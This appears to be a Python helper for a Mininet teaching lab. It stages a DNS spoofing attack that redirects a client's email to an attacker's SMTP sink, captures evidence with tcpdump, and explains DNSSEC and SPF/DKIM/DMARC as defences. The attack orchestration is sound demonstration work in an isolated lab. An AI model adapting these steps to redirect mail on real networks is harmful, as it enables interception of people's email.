#!/usr/bin/env python3
"""
DNS Spoofing/Poisoning Demonstration Helper

This module provides functions to demonstrate DNS spoofing attacks in a Mininet environment.
It shows how an attacker can forge DNS responses to redirect email traffic.

The demonstration includes:
1. Passive forged reply using the lightweight spoof_mx.py DNS responder
2. Evidence capture via tcpdump
3. Comparison with DNSSEC-enabled scenario (attack failure)
"""

import os
import sys
import time
import shlex

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

CHECK = "✔️"
CROSS = "✖️"


def say(msg: str):
    """Print message with flush."""
    print(msg, flush=True)


def pause(msg: str, interactive=True):
    """Pause for user interaction if in interactive mode."""
    if not interactive:
        return
    try:
        input(msg)
    except (EOFError, KeyboardInterrupt):
        pass


def _cmd(net, host, cmd):
    """Execute command on host."""
    return net.get(host).cmd(cmd)


def start_dns_spoofer(net, host, forged_domain='example.com', attacker_ip='10.0.0.66', 
                      attacker_mx='att.example.com', logfile='/tmp/dns_spoofer.log'):
    """
    Start the DNS spoofer on the attacker host using tools/spoof_mx.py.
    
    Args:
        net: Mininet network object
        host: Hostname of the attacker
        forged_domain: Domain to forge
        attacker_ip: IP address of the attacker
        attacker_mx: MX hostname for the attacker
        logfile: Path to log file
    
    Returns:
        bool: True if spoofer started successfully
    """
    h = net.get(host)
    
    # Kill any existing DNS servers
    h.cmd("pkill -9 named || true")
    h.cmd("pkill -9 -f spoof_mx.py || true")
    time.sleep(0.5)
    
    # Get the absolute path to spoof_mx.py
    script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    spoofer_path = os.path.join(script_dir, 'tools', 'spoof_mx.py')
    
    # Start the DNS spoofer in background
    cmd = (f"python3 {spoofer_path} "
           f"--domain {forged_domain} "
           f"--attacker-ip {attacker_ip} "
           f"--attacker-mx {attacker_mx} "
           f"> {logfile} 2>&1 &")
    
    h.cmd(cmd)
    time.sleep(1)
    
    # Check if it's listening on port 53
    check = h.cmd("ss -ulnp | grep ':53 ' || true")
    return bool(check.strip())


def start_tcpdump_capture(net, host, interface='any', output_file='/tmp/dns_spoof_capture.pcap',
                          filter_expr='udp port 53 or tcp port 25'):
    """
    Start tcpdump packet capture on a host.
    
    Args:
        net: Mininet network object
        host: Hostname to capture on
        interface: Network interface to capture on
        output_file: Path to save pcap file
        filter_expr: tcpdump filter expression
    
    Returns:
        bool: True if tcpdump started successfully
    """
    h = net.get(host)
    
    # Kill any existing tcpdump
    h.cmd("pkill -9 tcpdump || true")
    time.sleep(0.5)
    
    # Start tcpdump in background
    cmd = f"tcpdump -i {interface} -w {output_file} '{filter_expr}' > /tmp/tcpdump.log 2>&1 &"
    h.cmd(cmd)
    time.sleep(1)
    
    # Check if tcpdump is running
    check = h.cmd("pgrep -f tcpdump || true")
    return bool(check.strip())


def stop_tcpdump_capture(net, host):
    """Stop tcpdump on a host."""
    h = net.get(host)
    h.cmd("pkill -SIGINT tcpdump || true")
    time.sleep(0.5)


def start_smtp_sink(net, host, ip='0.0.0.0', port=25, logfile='/tmp/smtp_sink.log'):
    """
    Start an SMTP debugging sink on a host.
    
    Args:
        net: Mininet network object
        host: Hostname to start SMTP on
        ip: IP to bind to
        port: Port to listen on
        logfile: Path to log file
    
    Returns:
        bool: True if SMTP started successfully
    """
    h = net.get(host)
    
    # Kill any existing SMTP servers
    h.cmd(f"fuser -k {port}/tcp || true")
    time.sleep(0.5)
    
    # Start SMTP debugging server
    h.cmd(f"python3 -u -m smtpd -n -c DebuggingServer {ip}:{port} > {logfile} 2>&1 &")
    time.sleep(1)
    
    # Check if listening
    check = h.cmd(f"ss -ltnp | grep ':{port} ' || true")
    return bool(check.strip())


def dig_query(net, host, domain, qtype='MX', dns_server=None):
    """
    Perform a DNS query using dig.
    
    Args:
        net: Mininet network object
        host: Hostname to query from
        domain: Domain to query
        qtype: Query type (MX, A, TXT, etc.)
        dns_server: DNS server to query (None for resolver)
    
    Returns:
        str: Query result
    """
    h = net.get(host)
    server_arg = f"@{dns_server}" if dns_server else ""
    result = h.cmd(f"dig +short -t {qtype} {domain} {server_arg}").strip()
    return result


def send_test_email(net, host, to_addr, from_addr, server, subject='Test', body='Test message'):
    """
    Send a test email using swaks.
    
    Args:
        net: Mininet network object
        host: Hostname to send from
        to_addr: Recipient email address
        from_addr: Sender email address
        server: SMTP server IP/hostname
        subject: Email subject
        body: Email body
    
    Returns:
        tuple: (success: bool, output: str)
    """
    h = net.get(host)
    
    cmd = (f"swaks --to {to_addr} --from {from_addr} --server {server} "
           f"--header 'Subject: {subject}' --body '{body}' 2>&1")
    
    output = h.cmd(cmd)
    success = (" 250 OK" in output) or (" 250 2.0.0" in output) or (" 250 2.1.5" in output)
    
    return success, output


def run_dns_spoof_demo(net, interactive=True):
    """
    Run the complete DNS spoofing demonstration.
    
    This demonstrates:
    1. Starting packet capture
    2. Running DNS spoofer on attacker host
    3. Client queries resolve to forged MX
    4. Email is delivered to attacker instead of legitimate server
    5. Comparison with DNSSEC (if available)
    
    Args:
        net: Mininet network object
        interactive: If True, pause for screenshots
    """
    dns_ip = "10.0.0.53"
    att_ip = "10.0.0.66"
    mx_ip = "10.0.0.25"
    
    say("\n" + "=" * 80)
    say("DNS SPOOFING/POISONING ATTACK DEMONSTRATION")
    say("=" * 80)
    
    say("\n[*] This demo shows how an attacker can forge DNS responses to redirect email")
    say("[*] traffic to their own server, bypassing the legitimate mail server.\n")
    
    # Phase 1: Setup
    say("\n--- Phase 1: Setup and Baseline ---")
    
    say("\n[1.1] Starting packet capture on h1...")
    pcap_started = start_tcpdump_capture(net, 'h1', interface='any', 
                                         output_file='/tmp/dns_spoof_attack.pcap')
    say(f"  Packet capture: {CHECK if pcap_started else CROSS}")
    
    say("\n[1.2] Starting SMTP sinks on legitimate MX and attacker...")
    mx_smtp_ok = start_smtp_sink(net, 'mx', ip='0.0.0.0', port=25, logfile='/tmp/mx_smtp.log')
    att_smtp_ok = start_smtp_sink(net, 'att', ip='0.0.0.0', port=25, logfile='/tmp/att_smtp.log')
    say(f"  Legitimate MX (10.0.0.25:25): {CHECK if mx_smtp_ok else CROSS}")
    say(f"  Attacker MX (10.0.0.66:25): {CHECK if att_smtp_ok else CROSS}")
    
    pause("\n📸 Screenshot: Packet capture and SMTP listeners running. Press Enter...", interactive)
    
    # Phase 2: Normal DNS Resolution (Baseline)
    say("\n--- Phase 2: Baseline (Normal DNS Resolution) ---")
    
    say("\n[2.1] Configure h1 to use legitimate DNS server (10.0.0.53)...")
    _cmd(net, "h1", f"bash -lc 'printf \"nameserver {dns_ip}\\n\" > /etc/resolv.conf'")
    
    # Check if legitimate DNS is running, if not start it
    dns_check = dig_query(net, 'h1', 'example.com', 'MX', dns_server=dns_ip)
    if not dns_check:
        say("\n[2.2] Starting legitimate DNS server on dns host...")
        # Use the existing zone file
        script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        zone_file = os.path.join(script_dir, 'zones', 'db.example.com.good')
        
        h = net.get('dns')
        h.cmd("pkill -9 named || true")
        h.cmd("mkdir -p /var/cache/bind/zones")
        h.cmd(f"cp {zone_file} /var/cache/bind/zones/db.example.com")
        h.cmd("chown -R bind:bind /var/cache/bind")
        
        named_conf = """options {
    directory "/var/cache/bind";
    listen-on { 10.0.0.53; 127.0.0.1; };
    listen-on-v6 { none; };
    allow-query { any; };
    recursion no;
    dnssec-validation no;
};
zone "example.com" IN {
    type master;
    file "/var/cache/bind/zones/db.example.com";
};
"""
        # Write config file using printf to avoid command injection
        h.cmd(f"printf '%s' {shlex.quote(named_conf)} > /etc/bind/named.conf")
        h.cmd("named -4 -u bind -g -c /etc/bind/named.conf >/tmp/named.log 2>&1 & sleep 1")
    
    say("\n[2.3] Query MX record for example.com via legitimate DNS...")
    mx_result = dig_query(net, 'h1', 'example.com', 'MX', dns_server=dns_ip)
    say(f"  MX Result: {mx_result or '(empty)'}")
    
    if mx_result:
        # Extract MX hostname
        parts = mx_result.split()
        if len(parts) >= 2:
            mx_host = parts[-1].rstrip('.')
            say(f"\n[2.4] Query A record for {mx_host}...")
            a_result = dig_query(net, 'h1', mx_host, 'A', dns_server=dns_ip)
            say(f"  A Result: {a_result or '(empty)'}")
            
            if a_result:
                say(f"\n[2.5] Send test email to {a_result} (legitimate MX)...")
                success, output = send_test_email(net, 'h1', 'alice@example.com', 
                                                  'bob@client.local', a_result,
                                                  subject='Baseline test', 
                                                  body='This should go to legitimate MX')
                say(f"  Email sent: {CHECK if success else CROSS}")
                
                # Show brief swaks output
                if success:
                    for line in output.split('\n'):
                        if '250' in line or 'Ok' in line:
                            say(f"    {line.strip()}")
    
    pause("\n📸 Screenshot: Baseline DNS queries and email delivery. Press Enter...", interactive)
    
    # Phase 3: DNS Spoofing Attack
    say("\n--- Phase 3: DNS Spoofing Attack ---")
    
    say("\n[3.1] Starting DNS spoofer on attacker host (10.0.0.66)...")
    spoofer_started = start_dns_spoofer(net, 'att', forged_domain='example.com',
                                       attacker_ip=att_ip, attacker_mx='att.example.com',
                                       logfile='/tmp/dns_spoofer.log')
    say(f"  DNS Spoofer running: {CHECK if spoofer_started else CROSS}")
    
    if spoofer_started:
        # Show spoofer is listening
        check_output = _cmd(net, 'att', "ss -ulnp | grep ':53 '")
        say(f"  Listening on: {check_output.strip()}")
    
    say("\n[3.2] Configure h1 to use attacker's DNS server (10.0.0.66)...")
    _cmd(net, "h1", f"bash -lc 'printf \"nameserver {att_ip}\\n\" > /etc/resolv.conf'")
    
    say("\n[3.3] Query MX record for example.com via ATTACKER DNS...")
    forged_mx = dig_query(net, 'h1', 'example.com', 'MX', dns_server=att_ip)
    say(f"  Forged MX Result: {forged_mx or '(empty)'}")
    
    if forged_mx:
        # Extract MX hostname
        parts = forged_mx.split()
        if len(parts) >= 2:
            mx_host = parts[-1].rstrip('.')
            say(f"\n[3.4] Query A record for {mx_host} via attacker DNS...")
            a_result = dig_query(net, 'h1', mx_host, 'A', dns_server=att_ip)
            say(f"  Forged A Result: {a_result or '(empty)'}")
            
            if a_result and a_result == att_ip:
                say(f"\n  ⚠️  ATTACK SUCCESS: MX now resolves to attacker IP {att_ip}!")
                
                say(f"\n[3.5] Send email to {a_result} (ATTACKER's server)...")
                success, output = send_test_email(net, 'h1', 'victim@example.com',
                                                  'boss@bank.com', a_result,
                                                  subject='Confidential data',
                                                  body='This email is intercepted by attacker!')
                say(f"  Email sent: {CHECK if success else CROSS}")
                
                if success:
                    for line in output.split('\n'):
                        if '250' in line or 'Ok' in line:
                            say(f"    {line.strip()}")
                    
                    # Show attacker captured the email
                    time.sleep(1)
                    say("\n[3.6] Checking attacker's SMTP log...")
                    att_log = _cmd(net, 'att', "tail -20 /tmp/att_smtp.log")
                    if att_log and 'victim@example.com' in att_log:
                        say(f"  {CHECK} Attacker successfully intercepted the email!")
                        say("\n  --- Attacker's captured email (last 20 lines) ---")
                        for line in att_log.split('\n')[-20:]:
                            say(f"  {line}")
                    else:
                        say("  (No email captured yet in attacker log)")
    
    pause("\n📸 Screenshot: Forged DNS responses and email intercepted by attacker. Press Enter...", interactive)
    
    # Phase 4: Stop packet capture and show evidence
    say("\n--- Phase 4: Evidence Capture ---")
    
    say("\n[4.1] Stopping packet capture...")
    stop_tcpdump_capture(net, 'h1')
    time.sleep(1)
    
    say("\n[4.2] Packet capture saved to /tmp/dns_spoof_attack.pcap")
    pcap_info = _cmd(net, 'h1', "ls -lh /tmp/dns_spoof_attack.pcap 2>/dev/null || echo 'Not found'")
    say(f"  {pcap_info.strip()}")
    
    say("\n[4.3] DNS spoofer log (showing forged responses):")
    spoofer_log = _cmd(net, 'att', "tail -15 /tmp/dns_spoofer.log 2>/dev/null || echo '(empty)'")
    for line in spoofer_log.split('\n')[:15]:
        say(f"  {line}")
    
    pause("\n📸 Screenshot: Evidence files and logs. Press Enter...", interactive)
    
    # Phase 5: DNSSEC Comparison (if available)
    say("\n--- Phase 5: DNSSEC Protection (Demonstration) ---")
    
    say("\n[*] With DNSSEC enabled, the attack would fail because:")
    say("    1. DNS responses would be cryptographically signed")
    say("    2. The attacker cannot forge valid signatures")
    say("    3. DNSSEC-validating resolvers would reject unsigned/invalid responses")
    say("\n[*] To enable DNSSEC protection:")
    say("    - Run: sudo python3 mn_quickcheck_v6_with_dnssec.py")
    say("    - Queries with +dnssec flag would show RRSIG records")
    say("    - Forged responses would be marked as BOGUS and rejected")
    
    # Show what DNSSEC query would look like
    say("\n[5.1] Attempting DNSSEC query (will likely fail without signing)...")
    dnssec_result = _cmd(net, 'h1', f"dig +dnssec +short -t MX example.com @{dns_ip} 2>&1 | head -5")
    if dnssec_result.strip():
        say("  DNSSEC query result:")
        for line in dnssec_result.split('\n')[:5]:
            if line.strip():
                say(f"    {line}")
    else:
        say("  (No DNSSEC signatures - zone not signed)")
    
    pause("\n📸 Screenshot: DNSSEC information. Press Enter...", interactive)
    
    # Summary
    say("\n" + "=" * 80)
    say("DEMONSTRATION SUMMARY")
    say("=" * 80)
    
    say(f"\n{CHECK} Phase 1: Setup completed (packet capture + SMTP sinks)")
    say(f"{CHECK} Phase 2: Baseline established (legitimate DNS and email delivery)")
    say(f"{CHECK} Phase 3: DNS spoofing attack successful (email redirected to attacker)")
    say(f"{CHECK} Phase 4: Evidence captured in pcap and logs")
    say(f"ℹ️  Phase 5: DNSSEC would prevent this attack")
    
    say("\n[*] Attack Summary:")
    say("    - WITHOUT protection: Email delivered to attacker's server")
    say("    - WITH DNSSEC: Attack would be detected and prevented")
    say("    - WITH SPF/DKIM/DMARC: Email would be rejected or quarantined")
    
    say("\n[*] Evidence files:")
    say("    - /tmp/dns_spoof_attack.pcap - Full packet capture")
    say("    - /tmp/dns_spoofer.log - Attacker's DNS spoofer log")
    say("    - /tmp/att_smtp.log - Attacker's captured emails")
    say("    - /tmp/mx_smtp.log - Legitimate MX log")
    
    say("\n[*] Next steps:")
    say("    - Review packet capture: h1 tcpdump -r /tmp/dns_spoof_attack.pcap -n 'udp port 53'")
    say("    - Compare with DNSSEC: source mn_quickcheck_v6.cli (with signed zones)")
    say("    - Test SPF/DKIM validation with real mail clients")
    
    say("\n" + "=" * 80)
    say("Demo complete!")
    say("=" * 80 + "\n")
